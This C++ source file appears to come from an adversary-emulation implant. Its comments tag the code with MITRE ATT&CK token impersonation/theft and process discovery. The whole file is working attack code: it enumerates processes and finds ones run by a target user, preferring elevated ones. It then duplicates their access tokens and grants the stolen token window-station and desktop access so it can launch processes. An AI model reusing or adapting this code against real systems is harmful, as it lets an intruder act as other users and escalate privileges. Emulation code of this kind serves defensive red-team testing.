/*
 * Handle token-related functionality for execution as a different user.
 */

#include <accctrl.h>
#include <algorithm>
#include "execute.h"

namespace execute {

// Checks if target access token belongs to the specified user
// Reference: https://learn.microsoft.com/en-us/windows/win32/secauthz/searching-for-a-sid-in-an-access-token-in-c--
BOOL BelongsToTargetUser(
    ApiWrapperInterface* api_wrapper, 
    std::wstring target_user,
    HANDLE h_token,
    DWORD pid,
    DWORD* error_code
) {
    DWORD token_info_length = 0;
    PTOKEN_USER p_token_user = NULL;
    DWORD name_buffer_len = 512;
    DWORD domain_buffer_len = 512;
    std::vector<wchar_t> name_buffer(name_buffer_len);
    std::vector<wchar_t> domain_buffer(domain_buffer_len);
    SID_NAME_USE account_type;
    
    if (!api_wrapper->GetTokenInformationWrapper(h_token, TokenUser, NULL, token_info_length, &token_info_length)) {
        // First call is to get buffer size.
        *error_code = api_wrapper->GetLastErrorWrapper();
        if (*error_code != ERROR_INSUFFICIENT_BUFFER) {
            logging::LogMessage(
                api_wrapper,
                LOG_EXECUTION, 
                LOG_LEVEL_ERROR, 
                "Failed to get token information for PID " + std::to_string(pid) + ". Error code: " + std::to_string(*error_code)
            );
            return FALSE;
        }
    }
    p_token_user = (PTOKEN_USER)GlobalAlloc(GPTR, token_info_length);
    if (p_token_user == NULL) {
        *error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to allocate memory for token user information for PID " + std::to_string(pid) + ". Error code: " + std::to_string(*error_code)
        );
        return FALSE;
    }
    if (!api_wrapper->GetTokenInformationWrapper(h_token, TokenUser, p_token_user, token_info_length, &token_info_length)) {
        *error_code = api_wrapper->GetLastErrorWrapper();
        GlobalFree(p_token_user);
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to obtain token user information for PID " + std::to_string(pid) + ". Error code: " + std::to_string(*error_code)
        );
        return FALSE;
    }

    // get username and domain name from SID
    BOOL lookup_result = api_wrapper->LookupAccountSidWrapper(
        NULL,
        p_token_user->User.Sid,
        &name_buffer[0],
        &name_buffer_len,
        &domain_buffer[0],
        &domain_buffer_len,
        &account_type
    );
    if (!lookup_result) {
        *error_code = api_wrapper->GetLastErrorWrapper();
        GlobalFree(p_token_user);
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to look up username for token SID for PID " + std::to_string(pid) + ". Error code: " + std::to_string(*error_code)
        );
        return FALSE;
    }
    GlobalFree(p_token_user);
    std::wstring full_name = std::wstring(&domain_buffer[0]) + std::wstring(L"\\") + std::wstring(&name_buffer[0]);
    std::transform(full_name.begin(), full_name.end(), full_name.begin(), ::tolower);
    std::transform(target_user.begin(), target_user.end(), target_user.begin(), ::tolower);
    *error_code = ERROR_SUCCESS;
    return full_name.compare(target_user) == 0;
}

// Checks if target access token is elevated
BOOL IsElevatedToken(
    ApiWrapperInterface* api_wrapper, 
    HANDLE h_token,
    DWORD* error_code
) {
    TOKEN_ELEVATION_TYPE token_elev_type;
    DWORD size = sizeof(TOKEN_ELEVATION_TYPE);
    *error_code = ERROR_SUCCESS;
    
    if (!api_wrapper->GetTokenInformationWrapper(h_token, TokenElevationType, &token_elev_type, size, &size)) {
        *error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to obtain token elevation information. Error code: " + std::to_string(*error_code)
        );
        return FALSE;
    }
    return token_elev_type == TokenElevationTypeFull;
}

// Adjust object DACL to grant specified permission
DWORD GrantObjPermToSid(ApiWrapperInterface* api_wrapper, HANDLE h_obj, LPWSTR sid, DWORD desired_access) {
    SECURITY_INFORMATION security_info_dacl = DACL_SECURITY_INFORMATION;
    DWORD dacl_len;
    DWORD error_code;

    // First call is to get buffer size.
    api_wrapper->GetUserObjectSecurityWrapper(h_obj, &security_info_dacl, NULL, 0, &dacl_len);
    std::vector<unsigned char> dacl_buffer(dacl_len);
    PSECURITY_DESCRIPTOR p_dacl = (PSECURITY_DESCRIPTOR)(&dacl_buffer[0]);
    if (!api_wrapper->GetUserObjectSecurityWrapper(h_obj, &security_info_dacl, p_dacl, dacl_len, &dacl_len)) {
        error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to get object security info. Error code: " + std::to_string(error_code)
        );
        return error_code;
    }

    BOOL has_dacl;
    BOOL dacl_is_default;
    PACL curr_dacl;

    // Get object DACL
    if (!api_wrapper->GetSecurityDescriptorDaclWrapper(p_dacl, &has_dacl, &curr_dacl, &dacl_is_default)) {
        error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to get DACL for object. Error code: " + std::to_string(error_code)
        );
        return error_code;
    }
    
    // Add our desired access
    EXPLICIT_ACCESSW access_to_grant;
    access_to_grant.grfAccessPermissions = desired_access;
    access_to_grant.grfAccessMode = SET_ACCESS;
    access_to_grant.grfInheritance = NO_INHERITANCE;
    access_to_grant.Trustee.pMultipleTrustee = NULL;
    access_to_grant.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
    access_to_grant.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    access_to_grant.Trustee.TrusteeType = TRUSTEE_IS_USER;
    access_to_grant.Trustee.ptstrName = sid;

    // Set up new DACL
    PACL new_dacl;
    error_code = api_wrapper->SetEntriesInAclWrapper(1, &access_to_grant, curr_dacl, &new_dacl);
    if (error_code != ERROR_SUCCESS) {
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to set new DACL for object. Error code: " + std::to_string(error_code)
        );
        return error_code;
    }

    // Set new decurity descriptor
    SECURITY_DESCRIPTOR new_descriptor;
    if (!api_wrapper->InitializeSecurityDescriptorWrapper(&new_descriptor, SECURITY_DESCRIPTOR_REVISION)) {
        error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to initialize new security descriptor for object. Error code: " + std::to_string(error_code)
        );
        return error_code;
    }
    if (!api_wrapper->SetSecurityDescriptorDaclWrapper(&new_descriptor, TRUE, new_dacl, FALSE)) {
        error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to set new security descriptor for object. Error code: " + std::to_string(error_code)
        );
        return error_code;
    }
    if (!api_wrapper->SetUserObjectSecurityWrapper(h_obj, &security_info_dacl, &new_descriptor)) {
        error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to set new object security descriptor. Error code: " + std::to_string(error_code)
        );
        return error_code;
    }
    return ERROR_SUCCESS;
}

// Grants window station and desktop access to the specified token
DWORD GrantWindowStationDeskopAccess(ApiWrapperInterface* api_wrapper, HANDLE h_token) {
    DWORD error_code = ERROR_SUCCESS;

    // Get user SID for the token
    DWORD token_user_len;

    // First call gets length
    api_wrapper->GetTokenInformationWrapper(h_token, TokenUser, NULL, 0, &token_user_len);
    std::vector<unsigned char> token_user_buffer(token_user_len);
    PTOKEN_USER p_token_user = (PTOKEN_USER)(&token_user_buffer[0]);
    if (!api_wrapper->GetTokenInformationWrapper(h_token, TokenUser, p_token_user, token_user_len, &token_user_len)) {
        error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to get token user. Error code: " + std::to_string(error_code)
        );
        return error_code;
    }

    // Grant token user rights to worksation
    HWINSTA h_win_station = api_wrapper->GetProcessWindowStationWrapper();
    if (h_win_station == NULL) {
        error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to get handle to current proc window station. Error code: " + std::to_string(error_code)
        );
        return error_code;
    }
    error_code = GrantObjPermToSid(api_wrapper, h_win_station, (LPWSTR)(p_token_user->User.Sid), WINSTA_ALL_ACCESS | READ_CONTROL);
    // Do not close handle per microsoft documentation
    if (error_code != ERROR_SUCCESS) {
        return error_code;
    }

    // Grant token user rights to current thread desktop.
    DWORD curr_thread_id = api_wrapper->GetCurrentThreadIdWrapper();
    HDESK h_desktop = api_wrapper->GetThreadDesktopWrapper(curr_thread_id);
    if (h_desktop == NULL) {
        error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to get handle to thread desktop. Error code: " + std::to_string(error_code)
        );
        return error_code;
    }
    error_code = GrantObjPermToSid(api_wrapper, h_desktop, (LPWSTR)(p_token_user->User.Sid), GENERIC_ALL);
    api_wrapper->CloseDesktopWrapper(h_desktop);
    return error_code;
}

/*
 * GetRunasToken:
 *      About:
 *          Creates a primary access token copy of the access token for the specified target user by looking for
 *          processes running under that user and duplicating that token. Will prioritize elevated processes, if any.
 *      Result:
 *          Returns ERROR_SUCCESS on success, otherwise an error code.
 *          ph_new_token will point to the duplicated token on success.
 *      MITRE ATT&CK Techniques:
 *          T1057: Process Discovery
 *          T1134.001: Access Token Manipulation: Token Impersonation/Theft
 *      CTI:
 *          https://www.circl.lu/pub/tr-25/
 */
DWORD GetRunasToken(
    ApiWrapperInterface* api_wrapper, 
    std::wstring target_user,
    PHANDLE ph_new_token
) {
    // Reference: https://learn.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
    HANDLE h_process_snapshot = NULL;
    HANDLE h_curr_proc = NULL;
    HANDLE h_curr_proc_token = NULL;
    HANDLE h_token_to_duplicate = NULL;
    HANDLE h_elev_token_to_duplicate = NULL;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    DWORD error_code;
    BOOL obtained_nonelev_token = FALSE;
    BOOL obtained_elevated_token = FALSE;
    DWORD target_proc_id = 0;

    // Get a snapshot of all current processes
    h_process_snapshot = api_wrapper->CreateToolhelp32SnapshotWrapper(TH32CS_SNAPPROCESS, 0);
    if (h_process_snapshot == INVALID_HANDLE_VALUE) {
        error_code = api_wrapper->GetLastErrorWrapper();
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to get snapshot of current processes. Error code: " + std::to_string(error_code)
        );
        return error_code;
    }

    // Get info about first process
    if (!api_wrapper->Process32FirstWrapper(h_process_snapshot, &pe32)) {
        error_code = api_wrapper->GetLastErrorWrapper();
        api_wrapper->CloseHandleWrapper(h_process_snapshot);
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_ERROR, 
            "Failed to receive info on first process. Error code: " + std::to_string(error_code)
        );
        return error_code;
    }

    // Iterate through each process
    do {
        // Skip process ID of 0
        if (pe32.th32ProcessID == 0) {
            continue;
        }

        // Get process token so we can verify owner and integrity level
        h_curr_proc = api_wrapper->OpenProcessWrapper(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
        if (h_curr_proc == NULL) {
            error_code = api_wrapper->GetLastErrorWrapper();
            logging::LogMessage(
                api_wrapper,
                LOG_EXECUTION, 
                LOG_LEVEL_ERROR, 
                "Failed to open process ID " + std::to_string(pe32.th32ProcessID) + ". Error code: " + std::to_string(error_code)
            );
            continue;
        }
        if (!api_wrapper->OpenProcessTokenWrapper(h_curr_proc, TOKEN_QUERY, &h_curr_proc_token)) {
            error_code = api_wrapper->GetLastErrorWrapper();
            api_wrapper->CloseHandleWrapper(h_curr_proc);
            logging::LogMessage(
                api_wrapper,
                LOG_EXECUTION, 
                LOG_LEVEL_ERROR, 
                "Failed to open process token for process ID " + std::to_string(pe32.th32ProcessID) + ". Error code: " + std::to_string(error_code)
            );
            continue;
        }
        
        // Check if the access token belongs to our target user. 
        if (BelongsToTargetUser(api_wrapper, target_user, h_curr_proc_token, pe32.th32ProcessID, &error_code)) {
            // Check if elevated
            if (IsElevatedToken(api_wrapper, h_curr_proc_token, &error_code)) {
                logging::LogMessage(
                    api_wrapper,
                    LOG_EXECUTION, 
                    LOG_LEVEL_DEBUG, 
                    "Found elevated process ID " + std::to_string(pe32.th32ProcessID) + " belonging to target user."
                );

                // Get a token copy that we can duplicate
                if (!api_wrapper->OpenProcessTokenWrapper(h_curr_proc, TOKEN_QUERY | TOKEN_DUPLICATE, &h_elev_token_to_duplicate)) {
                    error_code = api_wrapper->GetLastErrorWrapper();
                    api_wrapper->CloseHandleWrapper(h_curr_proc);
                    api_wrapper->CloseHandleWrapper(h_curr_proc_token);
                    logging::LogMessage(
                        api_wrapper,
                        LOG_EXECUTION, 
                        LOG_LEVEL_ERROR, 
                        "Failed to open elevated process token to duplicate for process ID " + std::to_string(pe32.th32ProcessID) + ". Error code: " + std::to_string(error_code)
                    );
                    continue;
                }

                // Success. Clean up and exit loop.
                obtained_elevated_token = TRUE;
                target_proc_id = pe32.th32ProcessID;
                api_wrapper->CloseHandleWrapper(h_curr_proc);
                api_wrapper->CloseHandleWrapper(h_curr_proc_token);
                if (h_token_to_duplicate != NULL) {
                    api_wrapper->CloseHandleWrapper(h_token_to_duplicate);
                    h_token_to_duplicate = NULL;
                }
                break;
            } else if (!obtained_nonelev_token) {
                // Process the non-elevated token, if we don't already have a non-elevated token ready to duplicate
                logging::LogMessage(
                    api_wrapper,
                    LOG_EXECUTION, 
                    LOG_LEVEL_DEBUG, 
                    "Found non-elevated process ID " + std::to_string(pe32.th32ProcessID) + " belonging to target user."
                );

                // Get a token copy that we can duplicate
                if (!api_wrapper->OpenProcessTokenWrapper(h_curr_proc, TOKEN_QUERY | TOKEN_DUPLICATE, &h_token_to_duplicate)) {
                    error_code = api_wrapper->GetLastErrorWrapper();
                    api_wrapper->CloseHandleWrapper(h_curr_proc);
                    api_wrapper->CloseHandleWrapper(h_curr_proc_token);
                    logging::LogMessage(
                        api_wrapper,
                        LOG_EXECUTION, 
                        LOG_LEVEL_ERROR, 
                        "Failed to open process token to duplicate for process ID " + std::to_string(pe32.th32ProcessID) + ". Error code: " + std::to_string(error_code)
                    );
                    continue;
                }
                obtained_nonelev_token = TRUE;
                target_proc_id = pe32.th32ProcessID;
            }
        } else if (error_code != ERROR_SUCCESS) {
            api_wrapper->CloseHandleWrapper(h_curr_proc);
            api_wrapper->CloseHandleWrapper(h_curr_proc_token);
            logging::LogMessage(
                api_wrapper,
                LOG_EXECUTION, 
                LOG_LEVEL_ERROR, 
                "Failed to determine if target user is running process ID " + std::to_string(pe32.th32ProcessID) + ". Error code: " + std::to_string(error_code)
            );
            continue;
        }
        
        api_wrapper->CloseHandleWrapper(h_curr_proc);
        api_wrapper->CloseHandleWrapper(h_curr_proc_token);
    } while (api_wrapper->Process32NextWrapper(h_process_snapshot, &pe32) && !obtained_elevated_token);
    
    if (!obtained_elevated_token) {
        // We ran out of processes, or there was an error going to the next process.
        error_code = api_wrapper->GetLastErrorWrapper();
        api_wrapper->CloseHandleWrapper(h_process_snapshot);
        if (error_code != ERROR_NO_MORE_FILES) {
            logging::LogMessage(
                api_wrapper,
                LOG_EXECUTION, 
                LOG_LEVEL_ERROR, 
                "Unexpected error while iterating through processes. Error code: " + std::to_string(error_code)
            );
            return error_code;
        }

        if (obtained_nonelev_token) {
            logging::LogMessage(
                api_wrapper,
                LOG_EXECUTION, 
                LOG_LEVEL_DEBUG, 
                "Failed to find an elevated process for the target user. Using duplicated token from non-elevated process ID " + std::to_string(target_proc_id)
            );

            // Duplicate non-elevated token
            if (!api_wrapper->DuplicateTokenExWrapper(h_token_to_duplicate, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, ph_new_token)) {
                error_code = api_wrapper->GetLastErrorWrapper();
                api_wrapper->CloseHandleWrapper(h_token_to_duplicate);
                logging::LogMessage(
                    api_wrapper,
                    LOG_EXECUTION, 
                    LOG_LEVEL_ERROR, 
                    "Failed to duplicate non-elevated process token. Error code: " + std::to_string(error_code)
                );
                return error_code;
            }
            api_wrapper->CloseHandleWrapper(h_token_to_duplicate);
            logging::LogMessage(
                api_wrapper,
                LOG_EXECUTION, 
                LOG_LEVEL_DEBUG, 
                "Duplicated non-elevated process token for target user."
            );
            
            // grant window station and desktop access for nonelevated token
            error_code = GrantWindowStationDeskopAccess(api_wrapper, *ph_new_token);
            if (error_code != ERROR_SUCCESS) {
                logging::LogMessage(
                    api_wrapper,
                    LOG_EXECUTION, 
                    LOG_LEVEL_ERROR, 
                    "Failed to grant window station and desktop access for non-elevated process token. Error code: " + std::to_string(error_code)
                );
                return error_code;
            }
            return FAIL_FIND_TARGET_USER_ELEVATED_PROC;
        }

        // Failed to even get a non-elevated token
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_DEBUG, 
            "Did not find any suitable process for target user " + util::ConvertWstringToString(target_user)
        );
        return FAIL_FIND_TARGET_USER_PROC;
    } else {
        api_wrapper->CloseHandleWrapper(h_process_snapshot);
        if (h_token_to_duplicate != NULL) api_wrapper->CloseHandleWrapper(h_token_to_duplicate);

        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_DEBUG, 
            "Found elevated process token for target user. Process ID " + std::to_string(target_proc_id)
        );

        // Duplicate token
        if (!api_wrapper->DuplicateTokenExWrapper(h_elev_token_to_duplicate, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, ph_new_token)) {
            error_code = api_wrapper->GetLastErrorWrapper();
            api_wrapper->CloseHandleWrapper(h_elev_token_to_duplicate);
            logging::LogMessage(
                api_wrapper,
                LOG_EXECUTION, 
                LOG_LEVEL_ERROR, 
                "Failed to duplicate elevated process token. Error code: " + std::to_string(error_code)
            );
            return error_code;
        }
        api_wrapper->CloseHandleWrapper(h_elev_token_to_duplicate);
        logging::LogMessage(
            api_wrapper,
            LOG_EXECUTION, 
            LOG_LEVEL_DEBUG, 
            "Duplicated elevated process token for target user."
        );

        // grant window station and desktop access for token
        error_code = GrantWindowStationDeskopAccess(api_wrapper, *ph_new_token);
        if (error_code != ERROR_SUCCESS) {
            logging::LogMessage(
                api_wrapper,
                LOG_EXECUTION, 
                LOG_LEVEL_ERROR, 
                "Failed to grant window station and desktop access for elevated process token. Error code: " + std::to_string(error_code)
            );
            return error_code;
        }
        return ERROR_SUCCESS;
    }
}

} // namespace